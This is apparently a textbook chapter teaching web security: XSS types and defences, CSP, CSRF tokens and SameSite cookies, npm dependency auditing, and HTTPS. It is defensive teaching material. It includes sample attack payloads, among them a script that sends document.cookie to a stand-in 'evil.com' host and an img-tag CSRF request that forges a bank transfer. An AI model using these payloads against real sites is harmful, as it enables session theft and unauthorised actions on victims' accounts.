# Chapter 21 — Security

## Learning Objectives

By the end of this chapter you will be able to:

- Explain what XSS (Cross-Site Scripting) is and distinguish between stored, reflected, and DOM-based XSS.
- Prevent XSS by using `textContent`, input sanitization, and Content Security Policy (CSP).
- Explain what CSRF (Cross-Site Request Forgery) is and how tokens and SameSite cookies prevent it.
- Configure Content Security Policy headers to restrict what resources a page can load.
- Perform safe DOM manipulation (avoiding `innerHTML` with user data).
- Audit npm dependencies for known vulnerabilities with `npm audit`.
- Explain why HTTPS is essential for web security.

---

## 21.1 XSS — Cross-Site Scripting

XSS is the most common web vulnerability. It occurs when an attacker injects malicious JavaScript into a web page that other users view. The injected script runs with the same privileges as the page's own scripts — it can steal cookies, session tokens, personal data, or perform actions on behalf of the user.

### Types of XSS

#### Stored XSS (Persistent)

The malicious script is **saved to the server** (database, comment field, user profile) and served to every user who views that content.

```
Attacker posts a comment:
  "Great article! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"

The server saves it. Every visitor who loads the comments page executes the script.
```

This is the most dangerous type because it affects every visitor automatically.

#### Reflected XSS

The malicious script is embedded in a **URL or form submission**. The server reflects it back in the response without sanitizing it.

```
Attacker crafts a link:
  https://example.com/search?q=<script>alert('XSS')</script>

The server renders:
  <p>Results for: <script>alert('XSS')</script></p>

Anyone who clicks the link executes the script.
```

#### DOM-Based XSS

The vulnerability exists entirely in **client-side JavaScript**. The server never sees the malicious input — it goes directly from a source (URL, `location.hash`, `postMessage`) into a dangerous sink (`innerHTML`, `eval`, `document.write`).

```js
// Vulnerable code
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;

// Attack URL:
// https://example.com/page?name=<img src=x onerror=alert('XSS')>
```

---

## 21.2 Preventing XSS

### Rule 1: Use textContent, Not innerHTML

The most important defense against DOM-based XSS:

```js
// DANGEROUS — executes any HTML/script in userInput
element.innerHTML = userInput;

// SAFE — treats userInput as plain text, never as HTML
element.textContent = userInput;
```

`textContent` escapes all HTML. Even if `userInput` is `<script>alert('xss')</script>`, it renders as literal text.

### Rule 2: Sanitize User Input

If you must render HTML (rich text editors, markdown), sanitize it first. Remove all script tags, event handlers, and dangerous attributes:

```js
// Using DOMPurify (recommended library)
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = clean;
```

A minimal sanitizer removes tags and attributes that can execute scripts:

```js
function sanitizeHTML(html) {
  const div = document.createElement("div");
  div.textContent = html; // Escape everything
  return div.innerHTML;    // Returns the escaped string
}
```

For real applications, use a battle-tested library like DOMPurify. Rolling your own sanitizer is dangerous because there are countless XSS bypass techniques.

### Rule 3: Avoid Dangerous APIs

| Dangerous (avoid with user data) | Safe Alternative |
|---|---|
| `element.innerHTML = userInput` | `element.textContent = userInput` |
| `document.write(userInput)` | DOM manipulation methods |
| `eval(userInput)` | `JSON.parse()` for data, avoid eval entirely |
| `setTimeout(userString, ms)` | `setTimeout(function, ms)` |
| `new Function(userString)` | Avoid entirely |
| `location.href = userInput` | Validate URL scheme first |

### Rule 4: Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which resources are allowed to load. It is a powerful second line of defense:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; connect-src 'self' https://api.example.com
```

Key directives:

| Directive | Controls |
|---|---|
| `default-src` | Fallback for all resource types |
| `script-src` | Where scripts can be loaded from |
| `style-src` | Where styles can be loaded from |
| `img-src` | Where images can be loaded from |
| `connect-src` | Where fetch/XHR requests can go |
| `frame-src` | Where iframes can be loaded from |
| `object-src` | Where plugins (Flash, etc.) can load from |

Common source values:

| Value | Meaning |
|---|---|
| `'self'` | Same origin only |
| `'none'` | Block everything |
| `'unsafe-inline'` | Allow inline scripts/styles (weakens CSP) |
| `'unsafe-eval'` | Allow `eval()` (weakens CSP) |
| `https:` | Any HTTPS URL |
| `https://cdn.example.com` | Specific domain |
| `'nonce-abc123'` | Inline script with matching nonce attribute |

### Nonce-Based CSP

The most secure approach for inline scripts:

```
Content-Security-Policy: script-src 'nonce-a1b2c3d4'
```

```html
<!-- This script runs because the nonce matches -->
<script nonce="a1b2c3d4">
  console.log("Allowed");
</script>

<!-- This injected script is BLOCKED (no valid nonce) -->
<script>alert("XSS")</script>
```

The nonce must be unique per request and generated server-side.

---

## 21.3 CSRF — Cross-Site Request Forgery

### What CSRF Is

CSRF tricks a logged-in user's browser into making an unwanted request to a site where they are authenticated. The browser automatically includes cookies (including session cookies) with the request.

```
1. User is logged in to bank.com (has session cookie).
2. User visits evil.com.
3. evil.com contains: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. The browser sends the request to bank.com WITH the user's cookies.
5. bank.com processes the transfer because the session cookie is valid.
```

### Prevention: CSRF Tokens

The server generates a unique, unpredictable token for each session (or each form). The token is included in forms and verified on submission:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="random-token-here">
  <input type="text" name="amount">
  <button type="submit">Transfer</button>
</form>
```

The server rejects requests without a valid CSRF token. An attacker's page cannot read the token because of the Same-Origin Policy.

### Prevention: SameSite Cookies

The `SameSite` cookie attribute prevents the browser from sending cookies on cross-site requests:

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

| Value | Behavior |
|---|---|
| `Strict` | Cookie is never sent on cross-site requests (most secure) |
| `Lax` | Cookie is sent on cross-site top-level GET navigations (default in modern browsers) |
| `None` | Cookie is always sent (must use `Secure` flag; needed for legitimate cross-site use) |

### Prevention: Check the Origin Header

Verify that the `Origin` or `Referer` header matches your domain:

```js
// Server-side middleware
function csrfCheck(req, res, next) {
  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith("https://myapp.com")) {
    return res.status(403).json({ error: "CSRF check failed" });
  }
  next();
}
```

---

## 21.4 Safe DOM Manipulation

### The Core Principle

Never insert user-controlled data as HTML. Always use safe APIs:

```js
// SAFE — Creating elements programmatically
function createUserCard(user) {
  const card = document.createElement("div");
  card.className = "user-card";

  const name = document.createElement("h2");
  name.textContent = user.name; // Safe — auto-escapes

  const bio = document.createElement("p");
  bio.textContent = user.bio; // Safe — auto-escapes

  card.append(name, bio);
  return card;
}
```

```js
// DANGEROUS — Template with innerHTML
function createUserCardUnsafe(user) {
  const card = document.createElement("div");
  card.innerHTML = `
    <h2>${user.name}</h2>
    <p>${user.bio}</p>
  `; // If user.name is "<script>alert('xss')</script>", it EXECUTES
  return card;
}
```

### Template Literals Are Not Safe for HTML

Template literals do not escape HTML. They are just string concatenation:

```js
const userInput = '<img src=x onerror=alert("XSS")>';

// This is still dangerous:
element.innerHTML = `<p>${userInput}</p>`;
```

### Safe Alternatives

| Task | Unsafe | Safe |
|---|---|---|
| Set text | `el.innerHTML = text` | `el.textContent = text` |
| Set attribute | `el.setAttribute("href", url)` | Validate URL scheme first |
| Create elements | `container.innerHTML = html` | `document.createElement` + `textContent` |
| Insert HTML | `el.innerHTML = userHTML` | `DOMPurify.sanitize(userHTML)` |

---

## 21.5 Dependency Security

### The Problem

Your project's `node_modules` folder contains hundreds or thousands of packages, each written by different authors. Any one of them could contain a vulnerability or be compromised.

### npm audit

`npm audit` checks your dependency tree against a database of known vulnerabilities:

```bash
npm audit              # List vulnerabilities
npm audit fix          # Auto-fix where possible
npm audit fix --force  # Force-fix (may introduce breaking changes)
npm audit --production # Only check production dependencies
```

### Best Practices for Dependency Security

1. **Keep dependencies updated** — run `npm outdated` regularly and update.
2. **Minimize dependencies** — every package is a potential attack surface. Do you really need a library for `isOdd()`?
3. **Review new packages** — before `npm install`, check: how many downloads, how many maintainers, when was it last updated, is the source code on GitHub?
4. **Use lockfiles** — `package-lock.json` ensures consistent, reproducible installs.
5. **Enable Dependabot or Renovate** — automated tools that create pull requests when vulnerabilities are found.
6. **Pin versions in production** — use exact versions or conservative ranges for critical applications.

### Supply Chain Attacks

Attackers can:
- Compromise an npm account and publish a malicious update.
- Typosquat popular package names (`loadash` vs `lodash`).
- Add malicious `postinstall` scripts that run on `npm install`.

Defenses:
- Use `npm audit signatures` to verify package provenance.
- Review `postinstall` scripts: `npm install --ignore-scripts`, then review.
- Use `npm config set ignore-scripts true` for untrusted packages.

---

## 21.6 HTTPS

### Why HTTPS Matters

Without HTTPS, all data between the browser and server is sent in plain text. Anyone on the same network (coffee shop Wi-Fi, corporate proxy) can:

- **Read** the data (passwords, tokens, personal information).
- **Modify** the data (inject ads, malware, or redirect to phishing sites).
- **Impersonate** the server (man-in-the-middle attack).

### What HTTPS Provides

| Protection | How |
|---|---|
| **Encryption** | TLS encrypts data in transit. Only the browser and server can read it. |
| **Integrity** | Data cannot be modified in transit without detection. |
| **Authentication** | The server's TLS certificate proves its identity. |

### HTTPS Best Practices

- **Redirect all HTTP to HTTPS** — use a `301` redirect or set `Strict-Transport-Security` (HSTS).
- **Use `Secure` cookie flag** — cookies with `Secure` are only sent over HTTPS.
- **Never load mixed content** — an HTTPS page loading HTTP resources is insecure.
- **Use modern TLS** — TLS 1.2 minimum, TLS 1.3 preferred.

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

This header tells browsers to always use HTTPS for your domain for the next year.

---

## Tricky Things & Gotchas

1. **`innerHTML` is the #1 XSS vector** — even developers who know about XSS sometimes use `innerHTML` for convenience. Use `textContent` and `createElement` instead. If you must render HTML, use DOMPurify.

2. **CSP does not block inline event handlers by default** — `<div onclick="alert('xss')">` works unless you add `script-src` without `'unsafe-inline'`. A strict CSP should block all inline scripts.

3. **`SameSite=Lax` is the default** — modern browsers default to `Lax`, which provides some CSRF protection. But `Lax` still sends cookies on top-level GET navigations, so GET endpoints that change state are still vulnerable.

4. **CSRF tokens must be unique and unpredictable** — using a user's ID or a timestamp is not sufficient. Use a cryptographically random token.

5. **`eval()` is almost never necessary** — `JSON.parse` handles data, and `new Function` is rarely needed. If you think you need `eval`, you almost certainly do not.

6. **`npm audit` has false positives** — some reported vulnerabilities may not be exploitable in your specific usage. Read the advisory details before panicking.

7. **HTTPS does not mean the site is trustworthy** — HTTPS encrypts the connection, but a phishing site can have HTTPS too. It proves the server is who it claims to be, not that the operator is legitimate.

8. **Sanitization must happen on the server too** — client-side sanitization can be bypassed by sending requests directly (curl, Postman). Always validate and sanitize on the server.

---

## Best Practices

- Use `textContent` instead of `innerHTML` for any user-provided data.
- Implement Content Security Policy headers. Start strict and loosen only as needed.
- Use `SameSite=Strict` or `Lax` on all cookies. Add `HttpOnly` and `Secure` flags for session cookies.
- Include CSRF tokens in all state-changing forms and API requests.
- Run `npm audit` regularly and keep dependencies updated.
- Minimize your dependency footprint. Fewer dependencies means fewer attack vectors.
- Enforce HTTPS everywhere. Set up HSTS for your domain.
- Validate and sanitize user input on both the client and the server.

---

## Exercises

1. **XSS identification.** Given a code snippet that uses `innerHTML` to display a comment from a user, identify the XSS vulnerability and fix it using `textContent`.

2. **Sanitizer.** Write a function `escapeHTML(str)` that replaces `<`, `>`, `&`, `"`, and `'` with their HTML entities. Test it with strings containing script tags and event handlers.

3. **CSP header.** Write a Content Security Policy header that allows scripts only from your own domain, styles from your domain and Google Fonts, images from any HTTPS source, and blocks all other resources. Explain each directive.

4. **CSRF demo.** Create a simple HTML form that demonstrates how a CSRF attack works. Then add a CSRF token to the form and explain how the token prevents the attack.

5. **Safe DOM builder.** Write a `createTable(data)` function that takes an array of objects and builds an HTML table entirely with `createElement` and `textContent`. Verify that injecting `<script>` tags in the data does not execute them.

6. **Dependency audit.** Run `npm audit` on an existing project (or create one with intentionally outdated dependencies). Document the vulnerabilities found and how you would fix each one.

7. **Cookie security.** Explain the difference between these three cookies and which one is most secure:
   - `Set-Cookie: session=abc123`
   - `Set-Cookie: session=abc123; HttpOnly; Secure`
   - `Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict`

8. **Security review.** Review a small web application's code (or a snippet provided by your instructor). Identify at least three security issues and propose fixes with code examples.

---

## Mini-Lab

Run the Node.js examples in [`../../examples-node/phase-03/ch-21-security/`](../../examples-node/phase-03/ch-21-security/):

```bash
node examples-node/phase-03/ch-21-security/xss-examples.js
node examples-node/phase-03/ch-21-security/sanitize.js
```

The examples cover:
- Unsafe vs safe DOM manipulation patterns (demonstrated with string comparisons)
- A simple HTML sanitizer function that escapes dangerous characters

---

## What's Next

With security fundamentals in place, you now have the professional skills to build, test, optimize, and secure real web applications. The next phase will put all of these skills together in full-stack projects.
